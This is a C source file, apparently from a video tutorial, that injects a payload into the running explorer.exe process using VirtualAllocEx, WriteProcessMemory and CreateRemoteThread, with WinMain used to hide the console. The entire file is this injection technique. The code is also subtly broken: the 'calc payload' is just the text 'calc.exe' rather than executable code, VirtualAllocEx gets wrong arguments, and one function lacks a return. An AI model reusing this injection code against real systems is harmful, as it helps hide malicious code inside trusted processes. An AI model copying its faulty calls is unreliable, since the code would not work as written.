/*
    Author: Daniel Krilich
    Original Content - https://www.youtube.com/watch?v=7fV1_f0ipcY
*/

#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// calc payload
unsigned char payload[] = { 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65
};
// get handle of the target process
HANDLE FindTargetProcess(char *hprocessName) {

        int pid = 0;

        // create snapshot of what is running on the computer at this moment
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnap) return 0;

        // create an entry from a list of processes currently running on the machine
        PROCESSENTRY32 processListEntry;
        processListEntry.dwSize = sizeof(PROCESSENTRY32);

        // Redundancy in case there is an empty or nonexistant process in the snapshot
        if (!Process32First(hSnap, &processListEntry)) {
            CloseHandle(hSnap);
            return 0;
        }

        // Walkthrough all of the processes
        while (Process32Next(hSnap, &processListEntry)) {
            // if we find the process we are looking for
            if (lstrcmpiA(hprocessName, processListEntry.szExeFile) == 0) {
                // We then take it's PID
                pid = processListEntry.th32ProcessID;
                break;
            }
        }

        CloseHandle(hSnap);

        // Return
        if (pid != 0) {
            printf("Calc.exe PID = %d\n", pid);
            return OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                PROCESS_VM_OPERATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 
                FALSE, (DWORD) pid);

        }

        return NULL;

    }

// inject payload into target process's memory and execute it in a new remote thread
int InjectPayload(HANDLE hProcess, unsigned char * payload, unsigned int payLoadSize) {
        
        LPVOID pRemoteShellcode = NULL;
        pRemoteShellcode = VirtualAllocEx(hProcess, NULL, MEM_COMMIT, NULL, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProcess, pRemoteShellcode, (PVOID)payload, (SIZE_T)payLoadSize, (SIZE_T *)NULL);

        HANDLE hThread = NULL;
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteShellcode, NULL, 0, NULL);
            if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
            }
        return -1;
    }

// Create a Process
int LaunchProcess(char * ProcessPath){

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory ( &pi, sizeof(pi) );

        if (!CreateProcess( NULL, ProcessPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            return -1;
        }
        WaitForSingleObject( pi.hProcess, 500 );
        }

// use WinMain to hide the console
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdline, int nCmdShow) {

            HANDLE hProcess = NULL;
            unsigned int payLoadSize = sizeof(payload);

            hProcess = FindTargetProcess("explorer.exe");

            LaunchProcess("explorer.exe");

            if (hProcess != NULL) {
                InjectPayload(hProcess, payload, payLoadSize);
                CloseHandle(hProcess);    
            }

        return 0;
    }

